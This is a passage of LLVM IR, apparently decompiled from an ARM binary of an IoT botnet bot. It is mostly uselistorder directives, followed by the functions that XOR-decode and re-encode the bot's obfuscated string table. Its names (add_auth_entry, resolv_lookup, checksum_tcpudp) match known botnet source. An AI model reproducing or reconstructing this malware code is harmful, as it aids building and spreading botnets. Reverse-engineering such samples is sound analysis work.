  uselistorder i32 %v1_f060, { 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 30, 31, 32, 29, 28, 27, 26, 25, 24, 23, 22, 20, 21, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f05c, { 3, 4, 5, 6, 7, 0, 1, 2 }
  uselistorder i32 %stack_var_-1880.0, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10398, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f8bc, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10060, { 4, 5, 1, 0, 12, 13, 8, 11, 7, 10, 9, 6, 3, 2 }
  uselistorder i32 %v2_10108, { 1, 2, 0 }
  uselistorder i32 %v2_f620, { 0, 5, 1, 4, 2, 7, 3, 6 }
  uselistorder i32 %v2_f004, { 1, 3, 6, 5, 7, 0, 2, 4, 8, 9 }
  uselistorder i32 %v4_eee8, { 2, 1, 0, 3 }
  uselistorder i16 %v5_ee6c.le, { 1, 0 }
  uselistorder i32 %v0_ee60, { 2, 1, 0 }
  uselistorder i32 %v2_ee30, { 3, 2, 0, 1 }
  uselistorder i1 %v7_ee00, { 1, 0 }
  uselistorder i32 %v3_edf8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_ede4, { 1, 0 }
  uselistorder i32 %v2_edc8, { 1, 0, 2 }
  uselistorder i32 %storemerge328, { 1, 0 }
  uselistorder i32 %v0_ed20, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-60, { 10, 11, 12, 0, 1, 13, 5, 14, 2, 15, 6, 16, 3, 17, 4, 18, 7, 19, 20, 8, 21, 9, 22 }
  uselistorder i32* %r3.global-to-local, { 74, 62, 63, 64, 65, 66, 67, 68, 69, 70, 75, 76, 77, 78, 79, 80, 81, 82, 83, 85, 84, 86, 87, 41, 0, 1, 2, 42, 43, 44, 45, 46, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 17, 15, 16, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 133, 71, 72, 73, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 119, 121, 122, 124, 123, 120, 125, 165, 166, 126, 127, 164, 128, 129, 130, 131, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 155, 158, 157, 113, 159, 160, 161, 162, 163, 111, 112, 114, 115, 116, 117, 118 }
  uselistorder i32* %r2.global-to-local, { 51, 52, 35, 36, 37, 38, 39, 40, 41, 42, 43, 53, 54, 55, 56, 27, 44, 0, 1, 28, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32, 33, 34, 45, 46, 47, 48, 49, 50, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 89, 90, 93, 94, 96, 95, 92, 117, 97, 118, 98, 119, 120, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 91, 109, 110, 111, 112, 113, 114, 115, 116, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88 }
  uselistorder i32* %r1.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 59, 60, 61, 35, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 106, 37, 38, 39, 40, 41, 42, 88, 89, 52, 53, 54, 55, 56, 57, 58, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 87, 98, 99, 100, 101, 102, 103, 104, 105, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 4, 5, 17, 15, 16, 18, 1, 19, 20, 21, 22, 23, 24, 14, 13, 25, 26, 27, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 143, 49, 161, 32, 112, 145, 146, 126, 127, 113, 114, 81, 82, 83, 84, 85, 0, 120, 2, 3, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 15, 16, 17, 23, 24, 25, 20, 21, 22, 26, 27, 28, 29, 30, 31, 240, 33, 38, 34, 35, 36, 37, 39, 40, 41, 42, 43, 47, 48, 50, 44, 45, 46, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 14, 103, 104, 105, 100, 101, 102, 106, 107, 108, 109, 110, 111, 115, 116, 117, 118, 119, 239, 121, 122, 123, 124, 128, 130, 129, 131, 132, 133, 134, 135, 136, 138, 142, 18, 19, 144, 147, 149, 150, 151, 153, 152, 154, 155, 156, 164, 166, 167, 165, 162, 163, 141, 140, 137, 168, 139, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 238, 207, 208, 241, 209, 210, 237, 211, 212, 213, 214, 215, 216, 236, 217, 218, 219, 220, 221, 235, 222, 223, 224, 125, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 157, 158, 159, 148, 160 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 142, 33, 156, 32, 109, 110, 123, 139, 140, 124, 111, 81, 82, 83, 84, 0, 157, 2, 3, 4, 11, 5, 6, 8, 9, 10, 12, 13, 14, 15, 16, 18, 23, 24, 25, 20, 21, 22, 26, 27, 28, 29, 30, 31, 233, 34, 39, 35, 36, 37, 38, 40, 41, 42, 43, 44, 48, 49, 50, 45, 46, 47, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 7, 100, 101, 102, 97, 98, 99, 103, 104, 105, 106, 107, 108, 112, 113, 114, 115, 116, 232, 117, 118, 119, 120, 125, 127, 126, 128, 129, 130, 131, 132, 135, 136, 141, 17, 19, 143, 145, 146, 147, 148, 149, 150, 151, 160, 162, 163, 161, 158, 159, 138, 137, 133, 164, 134, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 235, 201, 202, 234, 203, 204, 231, 205, 206, 207, 208, 209, 210, 230, 211, 212, 213, 214, 215, 122, 216, 217, 218, 121, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 152, 153, 154, 144, 155 }
  uselistorder i32 (i32)* @resolv_entries_free, { 1, 0 }
  uselistorder i16** @global_var_224b4.148, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_224b4.148 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 8, 4, 5 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_19b50.207 to i32), { 5, 7, 2, 8, 6, 9, 3, 10, 0, 11, 1, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 15, 14, 13, 12, 11, 10, 9, 19, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 18, 17, 16, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 6, 7, 8, 9, 2, 3, 4, 5, 10, 11 }
  uselistorder i8 34, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 36, { 0, 1, 2, 3, 14, 15, 16, 17, 4, 5, 18, 19, 20, 21, 6, 7, 8, 9, 10, 11, 12, 13, 22, 23, 24, 25 }
  uselistorder i8 35, { 0, 1, 2, 3, 16, 17, 18, 19, 4, 5, 6, 7, 20, 21, 22, 23, 8, 9, 10, 11, 12, 13, 14, 15, 24, 25, 26, 27 }
  uselistorder i8 58, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13, 14, 15 }
  uselistorder i8 57, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 62, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i8 61, { 0, 1, 8, 9, 2, 3, 10, 11, 4, 5, 6, 7, 12, 13 }
  uselistorder i32 (i32)* @resolv_lookup, { 1, 0 }
  uselistorder i32 (i32)* @table_lock_val, { 50, 49, 37, 36, 35, 43, 48, 47, 46, 45, 44, 42, 41, 40, 39, 38, 34, 33, 2, 30, 29, 28, 32, 31, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 39, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42 }
  uselistorder i32 (i32)* @table_unlock_val, { 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 3, 22, 21, 20, 24, 23, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 2, 0 }
  uselistorder i32 384, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 2, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2249c.160 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 4, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 21, 22, 19, 20, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 29, { 4, 3, 0, 1, 2 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_19ae4.177 to i32), { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 3, 2, 1, 0, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_19acc.171 to i32), { 0, 2, 1, 3 }
  uselistorder i8* @global_var_224a9.166, { 1, 0 }
  uselistorder i16* @global_var_2249e.165, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i32 5888, { 0, 2, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_2249c.160 to i32), { 2, 3, 1, 0, 4, 5 }
  uselistorder i8* @global_var_224a8.161, { 1, 0 }
  uselistorder i8** @global_var_22488.157, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_22488.157 to i32), { 0, 7, 1, 6, 2, 5, 4, 3 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 74, 71, 22, 21, 70, 69, 68, 72, 67, 66, 65, 73, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 0, 29, 28, 27, 26, 25, 24, 23, 3, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_24fa0.155, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_24f9c.153, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_24f9c.153 to i32), { 1, 0, 2, 3, 4 }
  uselistorder i32 356, { 0, 5, 6, 7, 1, 8, 10, 2, 11, 12, 3, 4, 9 }
  uselistorder i32 388, { 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32* @global_var_224b8.142, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_24f80.59, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_24f80.59 to i32), { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_24fa4.140, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_104a8, { 1, 0 }
  uselistorder label %dec_label_pc_f704.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f704.backedge.thread564, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_f704.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1045c, { 1, 0 }
  uselistorder label %dec_label_pc_103bc, { 1, 0 }
  uselistorder label %dec_label_pc_101b0, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_10178, { 1, 0 }
  uselistorder label %dec_label_pc_10164, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_10154, { 1, 0 }
  uselistorder label %dec_label_pc_10044, { 1, 0 }
  uselistorder label %dec_label_pc_ff78, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ff60, { 1, 0 }
  uselistorder label %dec_label_pc_fe74, { 1, 0 }
  uselistorder label %dec_label_pc_fdb8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fda0, { 1, 0 }
  uselistorder label %dec_label_pc_fc70, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fc58, { 1, 0 }
  uselistorder label %dec_label_pc_fb9c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_fb84, { 1, 0 }
  uselistorder label %dec_label_pc_fb10, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fadc, { 1, 0 }
  uselistorder label %.thread100, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fabc, { 1, 0 }
  uselistorder label %dec_label_pc_faa8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_fa64, { 1, 0 }
  uselistorder label %dec_label_pc_fa64.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f9f8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f9e0, { 1, 0 }
  uselistorder label %dec_label_pc_f954, { 6, 7, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_f94c, { 4, 2, 5, 1, 0, 6, 3 }
  uselistorder label %dec_label_pc_f934, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f810, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_f7d8, { 1, 0 }
  uselistorder label %dec_label_pc_f76c, { 1, 0 }
  uselistorder label %.thread83, { 1, 0 }
  uselistorder label %dec_label_pc_f71c, { 1, 0 }
  uselistorder label %dec_label_pc_f70c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f70c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_f700.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_f608, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_f4f8.dec_label_pc_f4f8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f4d4.dec_label_pc_f4d4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f4c8, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f4b0, { 1, 0 }
  uselistorder label %dec_label_pc_f48c, { 1, 0 }
  uselistorder label %dec_label_pc_f334, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_f320, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_f1b4, { 1, 0 }
  uselistorder label %dec_label_pc_f1a8, { 1, 0 }
  uselistorder label %dec_label_pc_f19c, { 1, 0 }
  uselistorder label %dec_label_pc_f190, { 1, 0 }
  uselistorder label %dec_label_pc_f184, { 1, 0 }
  uselistorder label %dec_label_pc_f170, { 1, 0 }
  uselistorder label %dec_label_pc_f15c, { 1, 0 }
  uselistorder label %dec_label_pc_f148, { 1, 0 }
  uselistorder label %dec_label_pc_f128, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f104, { 1, 0 }
  uselistorder label %dec_label_pc_f0f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0d4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f0b0, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_f05c, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_ee60, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_24fac.216 to i32), i32* @r2, align 4
  %v3_104b4 = mul i32 %arg1, 8
  %v2_104b8 = add i32 %v3_104b4, ptrtoint (i32* @global_var_24fac.216 to i32)
  store i32 %v2_104b8, i32* @r3, align 4
  %v2_104bc = icmp eq i32* %arg2, null
  br i1 %v2_104bc, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_104c44 = inttoptr i32 %v2_104b8 to i32*
  %v4_104c45 = load i32, i32* %v3_104c44, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_104c0 = add i32 %v3_104b4, add (i32 ptrtoint (i32* @global_var_24fac.216 to i32), i32 4)
  %v3_104c0 = inttoptr i32 %v2_104c0 to i16*
  %v4_104c0 = load i16, i16* %v3_104c0, align 4
  %v5_104c0 = zext i16 %v4_104c0 to i32
  store i32 %v5_104c0, i32* @r3, align 4
  %v3_104c4 = inttoptr i32 %v2_104b8 to i32*
  %v4_104c4 = load i32, i32* %v3_104c4, align 4
  store i32 %v5_104c0, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_104c46 = phi i32 [ %v4_104c45, %.thread ], [ %v4_104c4, %bb ]
  ret i32 %v4_104c46

; uselistorder directives
  uselistorder i32 %v2_104b8, { 1, 0, 2 }
  uselistorder i32 %v3_104b4, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_104dc = mul i32 %arg1, 8
  %v2_104e0 = add i32 %v3_104dc, ptrtoint (i32* @global_var_24fac.216 to i32)
  %v2_104e4 = load i32, i32* @global_var_222fc.219, align 4
  store i32 %v2_104e4, i32* @r1, align 4
  %v1_104e8 = add i32 %v3_104dc, add (i32 ptrtoint (i32* @global_var_24fac.216 to i32), i32 4)
  %v2_104e8 = inttoptr i32 %v1_104e8 to i16*
  %v3_104e8 = load i16, i16* %v2_104e8, align 4
  %v3_104ec = udiv i32 %v2_104e4, 256
  %v2_104f0 = icmp eq i16 %v3_104e8, 0
  %v3_104f4 = udiv i32 %v2_104e4, 65536
  store i32 %v3_104f4, i32* @r3, align 4
  %v3_104f8 = load i32, i32* @r4, align 4
  store i32 %v3_104f8, i32* %stack_var_-16, align 4
  %v1_104fc = urem i32 %v3_104ec, 256
  store i32 %v1_104fc, i32* %r6.global-to-local, align 4
  %v1_10500 = urem i32 %v3_104f4, 256
  store i32 %v1_10500, i32* %r5.global-to-local, align 4
  %v3_10504 = udiv i32 %v2_104e4, 16777216
  store i32 %v3_10504, i32* %r4.global-to-local, align 4
  %v1_10508 = urem i32 %v2_104e4, 256
  store i32 %v1_10508, i32* %lr.global-to-local, align 4
  br i1 %v2_104f0, label %dec_label_pc_10564, label %dec_label_pc_10510

dec_label_pc_10510:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_10514 = inttoptr i32 %v2_104e0 to i32*
  br label %dec_label_pc_10514

dec_label_pc_10514:                               ; preds = %dec_label_pc_10514.dec_label_pc_10514_crit_edge, %dec_label_pc_10510
  %v0_1051c = phi i32 [ %v0_1051c.pre, %dec_label_pc_10514.dec_label_pc_10514_crit_edge ], [ %v1_10508, %dec_label_pc_10510 ]
  %v2_10520 = phi i32 [ %v1_10558, %dec_label_pc_10514.dec_label_pc_10514_crit_edge ], [ 0, %dec_label_pc_10510 ]
  %v2_10514 = load i32, i32* %v1_10514, align 4
  %v2_10518 = add i32 %v2_10514, %v2_10520
  %v3_10518 = inttoptr i32 %v2_10518 to i8*
  %v4_10518 = load i8, i8* %v3_10518, align 1
  %v6_10518 = zext i8 %v4_10518 to i32
  %v2_1051c = xor i32 %v6_10518, %v0_1051c
  %v1_10520 = trunc i32 %v2_1051c to i8
  store i8 %v1_10520, i8* %v3_10518, align 1
  %v2_10524 = load i32, i32* %v1_10514, align 4
  %v0_10528 = load i32, i32* @ip, align 4
  %v2_10528 = add i32 %v0_10528, %v2_10524
  %v3_10528 = inttoptr i32 %v2_10528 to i8*
  %v4_10528 = load i8, i8* %v3_10528, align 1
  %v6_10528 = zext i8 %v4_10528 to i32
  %v0_1052c = load i32, i32* %r6.global-to-local, align 4
  %v2_1052c = xor i32 %v0_1052c, %v6_10528
  %v1_10530 = trunc i32 %v2_1052c to i8
  store i8 %v1_10530, i8* %v3_10528, align 1
  %v2_10534 = load i32, i32* %v1_10514, align 4
  %v0_10538 = load i32, i32* @ip, align 4
  %v2_10538 = add i32 %v0_10538, %v2_10534
  %v3_10538 = inttoptr i32 %v2_10538 to i8*
  %v4_10538 = load i8, i8* %v3_10538, align 1
  %v6_10538 = zext i8 %v4_10538 to i32
  %v0_1053c = load i32, i32* %r5.global-to-local, align 4
  %v2_1053c = xor i32 %v0_1053c, %v6_10538
  %v1_10540 = trunc i32 %v2_1053c to i8
  store i8 %v1_10540, i8* %v3_10538, align 1
  %v2_10544 = load i32, i32* %v1_10514, align 4
  store i32 %v2_10544, i32* @r1, align 4
  %v0_10548 = load i32, i32* @ip, align 4
  %v2_10548 = add i32 %v0_10548, %v2_10544
  %v3_10548 = inttoptr i32 %v2_10548 to i8*
  %v4_10548 = load i8, i8* %v3_10548, align 1
  %v6_10548 = zext i8 %v4_10548 to i32
  %v0_1054c = load i32, i32* %r4.global-to-local, align 4
  %v2_1054c = xor i32 %v0_1054c, %v6_10548
  store i32 %v2_1054c, i32* @r3, align 4
  %v1_10550 = trunc i32 %v2_1054c to i8
  store i8 %v1_10550, i8* %v3_10548, align 1
  %v3_10554 = load i16, i16* %v2_104e8, align 4
  %v4_10554 = zext i16 %v3_10554 to i32
  %v0_10558 = load i32, i32* @ip, align 4
  %v1_10558 = add i32 %v0_10558, 1
  store i32 %v1_10558, i32* @ip, align 4
  %v8_10560 = icmp sgt i32 %v4_10554, %v1_10558
  br i1 %v8_10560, label %dec_label_pc_10514.dec_label_pc_10514_crit_edge, label %dec_label_pc_10564.loopexit

dec_label_pc_10514.dec_label_pc_10514_crit_edge:  ; preds = %dec_label_pc_10514
  %v0_1051c.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10514

dec_label_pc_10564.loopexit:                      ; preds = %dec_label_pc_10514
  %v2_10564.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_10564.loopexit, %entry
  %v2_10564 = phi i32 [ %v2_10564.pre, %dec_label_pc_10564.loopexit ], [ %v3_104f8, %entry ]
  store i32 %v2_10564, i32* @r4, align 4
  ret i32 %v2_104e0

; uselistorder directives
  uselistorder i32 %v1_10558, { 1, 2, 0 }
  uselistorder i32 %v1_10508, { 1, 0 }
  uselistorder i32 %v3_104f4, { 1, 0 }
  uselistorder i32 %v2_104e4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_104dc, { 1, 0 }
}

define i32 @table_unlock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1057c = mul i32 %arg1, 8
  %v2_10580 = add i32 %v3_1057c, ptrtoint (i32* @global_var_24fac.216 to i32)
  %v2_10584 = load i32, i32* @global_var_222fc.219, align 4
  %v1_10588 = add i32 %v3_1057c, add (i32 ptrtoint (i32* @global_var_24fac.216 to i32), i32 4)
  %v2_10588 = inttoptr i32 %v1_10588 to i16*
  %v3_10588 = load i16, i16* %v2_10588, align 4
  %v3_1058c = udiv i32 %v2_10584, 256
  %v2_10590 = icmp eq i16 %v3_10588, 0
  %v3_10594 = udiv i32 %v2_10584, 65536
  %v3_10598 = load i32, i32* @r4, align 4
  store i32 %v3_10598, i32* %stack_var_-16, align 4
  %v1_1059c = urem i32 %v3_1058c, 256
  store i32 %v1_1059c, i32* %r6.global-to-local, align 4
  %v1_105a0 = urem i32 %v3_10594, 256
  store i32 %v1_105a0, i32* %r5.global-to-local, align 4
  %v3_105a4 = udiv i32 %v2_10584, 16777216
  store i32 %v3_105a4, i32* %r4.global-to-local, align 4
  %v1_105a8 = urem i32 %v2_10584, 256
  store i32 %v1_105a8, i32* %lr.global-to-local, align 4
  br i1 %v2_10590, label %dec_label_pc_10604, label %dec_label_pc_105b0

dec_label_pc_105b0:                               ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_105b4 = inttoptr i32 %v2_10580 to i32*
  br label %dec_label_pc_105b4

dec_label_pc_105b4:                               ; preds = %dec_label_pc_105b4.dec_label_pc_105b4_crit_edge, %dec_label_pc_105b0
  %v0_105bc = phi i32 [ %v0_105bc.pre, %dec_label_pc_105b4.dec_label_pc_105b4_crit_edge ], [ %v1_105a8, %dec_label_pc_105b0 ]
  %v2_105c0 = phi i32 [ %v1_105f8, %dec_label_pc_105b4.dec_label_pc_105b4_crit_edge ], [ 0, %dec_label_pc_105b0 ]
  %v2_105b4 = load i32, i32* %v1_105b4, align 4
